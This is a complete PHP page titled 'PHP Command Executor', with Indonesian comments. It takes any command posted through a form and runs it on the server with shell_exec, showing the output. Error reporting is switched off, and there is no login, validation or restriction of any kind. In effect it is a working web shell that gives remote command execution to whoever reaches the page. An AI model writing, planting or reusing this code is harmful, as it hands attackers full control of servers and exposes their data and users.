<?php
error_reporting(0);

$output = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['command'])) {
    $command = $_POST['command'];

    // Jalankan perintah via shell
    $output = shell_exec($command . " 2>&1");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Command Executor</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .box { background: #fff; border: 1px solid #ccc; padding: 20px; width: 600px; }
        textarea { width: 100%; height: 300px; background: #111; color: #0f0; font-family: monospace; padding: 10px; }
        input[type=text] { width: 80%; padding: 5px; }
        input[type=submit] { padding: 5px 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>PHP Command Executor</h2>
        <form method="post">
            <input type="text" name="command" placeholder="Masukkan perintah..." required>
            <input type="submit" value="Execute">
        </form>
        <br>
        <h3>Output:</h3>
        <textarea readonly><?php echo htmlspecialchars($output); ?></textarea>
    </div>
</body>
</html>
